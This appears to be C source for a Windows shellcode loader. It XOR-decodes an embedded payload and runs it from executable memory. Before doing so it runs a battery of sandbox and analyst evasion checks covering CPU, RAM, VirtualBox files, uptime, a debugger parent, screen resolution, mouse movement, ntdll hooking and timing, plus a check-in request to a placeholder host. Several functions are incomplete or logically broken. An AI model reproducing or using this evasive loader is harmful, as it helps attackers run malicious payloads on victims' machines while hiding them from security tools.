#include "Header.h"

void XorAndInjectShellcode()
{
	BYTE* shellcode_executable = (BYTE*)VirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	for (int i = 0; i < sizeof shellcode; i++)
	{
		shellcode_executable[i] = shellcode[i] ^ 0x13;
	}
	DWORD threadID;
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_executable, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);
}
void RunShellcode() {
	HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
	PVirtualAlloc funcVirtualAlloc = (PVirtualAlloc)GetProcAddress(hKernel32, "VirtualAlloc");
	PCreateThread funcCreateThread = (PCreateThread)GetProcAddress(hKernel32, "CreateThread");
	PWaitForSingleObject funcWaitForSingleObject = (PWaitForSingleObject)GetProcAddress(hKernel32, "WaitForSingleObject");

	unsigned char shellcode_executable[sizeof shellcode];

	for (int i = 0; i < sizeof shellcode; i++)
	{
		shellcode_executable[i] = shellcode[i] ^ 0x13;
	}
	
	PVOID shellcode_exec = funcVirtualAlloc(0, sizeof shellcode_executable, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(shellcode_exec, shellcode_executable, sizeof shellcode);
	DWORD threadID;
	HANDLE hThread = funcCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
	funcWaitForSingleObject(hThread, INFINITE);
}

// Environmental checks
bool CheckCPU()
{
	SYSTEM_INFO systemInfo;
	DWORD numberOfProcessors;

	// CHECK NUMBER OF LOGICAL PROCESSORS //
	GetSystemInfo(&systemInfo);
	numberOfProcessors = systemInfo.dwNumberOfProcessors;
	////////////////////////////////////////

	if (numberOfProcessors < minimumCPU) return true;
	else return false;
}
bool CheckRAM()
{
	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	DWORD RAMMegaBytes;

	// CHECK PHYSICAL MEMORY AMOUNT //
	GlobalMemoryStatusEx(&memoryStatus);
	RAMMegaBytes = memoryStatus.ullTotalPhys / 1024 / 1024;
	//////////////////////////////////

	if (RAMMegaBytes < minRAM) return true;
	else return false;
}
bool CheckVMFiles()
{
	WIN32_FIND_DATAA findFileData;
	bool anyFileExists;

	// SEARCH FOR FILES SPECIFIC FOR YOUR HYPERVISOR //
	HANDLE findFileHandle1 = FindFirstFileA("C:\\Windows\\System32\\VBox*.dll", &findFileData);
	//Change to VMWare when finilizing
	HANDLE findFileHandle2 = FindFirstFileA("C:\\Program Files\\Blablabla", &findFileData);
	anyFileExists = (findFileHandle1 != INVALID_HANDLE_VALUE || findFileHandle2 != INVALID_HANDLE_VALUE);
	///////////////////////////////////////////////////

	if (anyFileExists) {
		printf("Sandbox!");
		return true;
	} 
	else return false;
}
bool CheckUptime()
{
	ULONGLONG uptime_minutes = GetTickCount64() / (60 * 1000);
	if (uptime_minutes < minUptimeMinutes) return true;
	else return false;
}
bool ParentProcess() {
	DWORD parentPid = GetParentPID(GetCurrentProcessId());
	WCHAR parentName[MAX_PATH + 1];
	DWORD dwParentName = MAX_PATH;
	HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentPid);
	QueryFullProcessImageNameW(hParent, 0, parentName, &dwParentName); // another way to get process name is to use 'Toolhelp32Snapshot'
	CharUpperW(parentName);
	if (wcsstr(parentName, L"WINDBG.EXE")) return true;
	else return false;
}
bool CheckHDD() {
	HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	DISK_GEOMETRY pDiskGeometry;
	DWORD bytesReturned;
	DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
	DWORD diskSizeGB;
	diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
	if (diskSizeGB < minHDD) return false;
}
bool CALLBACK MyCallback(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lpRect, LPARAM data)
{
	MONITORINFO monitorInfo;
	monitorInfo.cbSize = sizeof(MONITORINFO);
	GetMonitorInfoW(hMonitor, &monitorInfo);
	int xResolution = monitorInfo.rcMonitor.right - monitorInfo.rcMonitor.left;
	int yResolution = monitorInfo.rcMonitor.top - monitorInfo.rcMonitor.bottom;
	if (xResolution < 0) xResolution = -xResolution;
	if (yResolution < 0) yResolution = -yResolution;
	if ((xResolution != 1920 && xResolution != 2560 && xResolution != 1440)
		|| (yResolution != 1080 && yResolution != 1200 && yResolution != 1600 && yResolution != 900))
	{
		*((BOOL*)data) = true;
	}
	return true;
}
bool CheckScreen() {
	MONITORENUMPROC pMyCallback = (MONITORENUMPROC)MyCallback;
	int xResolution = GetSystemMetrics(SM_CXSCREEN);
	int yResolution = GetSystemMetrics(SM_CYSCREEN);
	if (xResolution < resMinX && yResolution < resMinY)  return false;

	int numberOfMonitors = GetSystemMetrics(SM_CMONITORS);
	bool sandbox = false;
	EnumDisplayMonitors(NULL, NULL, pMyCallback, (LPARAM)(&sandbox));
	if (sandbox) return false;
	else return true; 
}
bool CheckInternet() {
	HINTERNET hSession = WinHttpOpen(L"Mozilla 5.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	HINTERNET hConnection = WinHttpConnect(hSession, L"my.domain.or.ip", INTERNET_DEFAULT_HTTP_PORT, 0);
	HINTERNET hRequest = WinHttpOpenRequest(hConnection, L"GET", L"test", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);
	WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
	WinHttpReceiveResponse(hRequest, 0);
	DWORD responseLength;
	WinHttpQueryDataAvailable(hRequest, &responseLength);
	PVOID response = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, responseLength + 1);
	WinHttpReadData(hRequest, response, responseLength, &responseLength);
	if (atoi((PSTR)response) != 1337) return false;
}


// Dynamic analysis
bool CheckHooking() {
	// manually load the dll
	HANDLE dllFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dllFileSize = GetFileSize(dllFile, NULL);
	HANDLE hDllFileMapping = CreateFileMappingW(dllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	HANDLE pDllFileMappingBase = MapViewOfFile(hDllFileMapping, FILE_MAP_READ, 0, 0, 0);
	CloseHandle(dllFile);

	// analyze the dll
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pDllFileMappingBase;
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)pDllFileMappingBase + pDosHeader->e_lfanew);
	PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER) & (pNtHeader->OptionalHeader);
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pDllFileMappingBase + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PULONG pAddressOfFunctions = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfFunctions);
	PULONG pAddressOfNames = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfNames);
	PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfNameOrdinals);

	// find the original function code
	PVOID pNtCreateThreadExOriginal = NULL;
	for (int i = 0; i < pExportDirectory->NumberOfNames; ++i)
	{
		PCSTR pFunctionName = (PSTR)((PBYTE)pDllFileMappingBase + pAddressOfNames[i]);
		if (!strcmp(pFunctionName, "NtCreateThreadEx"))
		{
			pNtCreateThreadExOriginal = (PVOID)((PBYTE)pDllFileMappingBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
			break;
		}
	}

	// compare functions
	PVOID pNtCreateThreadEx = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateThreadEx");
	if (memcmp(pNtCreateThreadEx, pNtCreateThreadExOriginal, 16)) return false;
	else return true;


}

// Static analysis
bool PerformAPIHashing() {
	// todo
}


// User behaviour
bool CheckMouseActivity() {
	POINT position1, position2;

	GetCursorPos(&position1);
	Sleep(mouseMovementTime);
	GetCursorPos(&position2);

	if ((position1.x == position2.x) && (position1.y == position2.y))
		// No mouse activity during the sleep.
		return TRUE;
	else
		return FALSE;
}


// Timers
bool Delay() {
	Sleep(delayMs);
	ULONG* PUserSharedData_TickCountMultiplier = (PULONG)0x7ffe0004;
	LONG* PUserSharedData_High1Time = (PLONG)0x7ffe0324;
	ULONG* PUserSharedData_LowPart = (PULONG)0x7ffe0320;
	DWORD time = GetTickCount64();
	DWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_High1Time << 8) +
		((*PUserSharedData_LowPart) * (unsigned __int64)(*PUserSharedData_TickCountMultiplier) >> 24);
	if ((time - kernelTime) > 100 && (kernelTime - time) > 100) return false;
}
//show result in VT
bool Delay_old() {
	ULONGLONG uptimeBeforeSleep = GetTickCount64();
	typedef NTSTATUS(WINAPI* PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
	PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDelayExecution");
	LARGE_INTEGER delay;
	delay.QuadPart = -10000 * 100000; // 100 seconds
	pNtDelayExecution(FALSE, &delay);
	ULONGLONG uptimeAfterSleep = GetTickCount64();
	if ((uptimeAfterSleep - uptimeBeforeSleep) < 100000) return false;
}



// ##############
bool Sandboxed()
{
	if (CheckCPU() || CheckRAM() || CheckVMFiles() || CheckHDD() || CheckUptime()) return true;

	else return false;
}
// ##############

int main()
{
// setting debug values for environmental changes
	if (isDebug) setDebuglValues();


	if (Sandboxed()) return 0;
	if (ParentProcess()) return 0;
	if (CheckScreen()) return 0; 
	if (CheckInternet()) return 0;  
	if(!CheckHooking()) return 0;
	if(CheckMouseActivity()) return 0;

	Delay();

	RunShellcode();
	//XorAndInjectShellcode();
}